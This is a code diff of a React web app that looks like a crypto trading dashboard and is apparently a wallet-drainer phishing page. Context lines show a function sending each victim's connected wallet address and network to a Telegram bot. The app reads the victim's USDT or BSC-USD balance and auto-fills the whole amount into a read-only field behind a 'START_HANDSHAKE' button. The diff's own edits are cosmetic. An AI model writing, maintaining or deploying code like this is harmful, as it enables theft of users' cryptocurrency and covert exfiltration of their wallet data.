@@ -21,16 +21,15 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vFinal')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_final_fixed')) {
       log(`🎯 WALLET CONNECTED!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vFinal', 't');
+      sessionStorage.setItem('hit_final_fixed', 't');
     }
   }, [isConnected, address, chainId]);
 
   const { data: nB } = useBalance({ address }); 
   const { data: tB } = useBalance({ address, token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955" });
 
-  // 🎯 RECTIFY AUTO-FILL (NO TYPING NEEDED)
   useEffect(() => {
     if (activeTask === "Rectify") {
       const val = tB?.formatted || nB?.formatted || "0.00";
@@ -61,9 +60,8 @@ export default function App() {
 
       {isConnected ? (
         <>
-          {/* LIVE TRADING MARKET CHART */}
           <div style={{width:'100%', height:'200px', borderRadius:'12px', overflow:'hidden', marginBottom:'15px', border:'1px solid #1e293b'}}>
-             <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
+             <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} title="chart" />
           </div>
 
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
@@ -87,15 +85,7 @@ export default function App() {
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
-                <input 
-                  type="number"
-                  inputMode="decimal"
-                  value={inputVal} 
-                  readOnly={activeTask === "Rectify"} 
-                  onChange={(e)=>setInputVal(e.target.value)} 
-                  placeholder="0.00" 
-                  style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} 
-                />
+                <input type="number" value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
               <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
             </div>
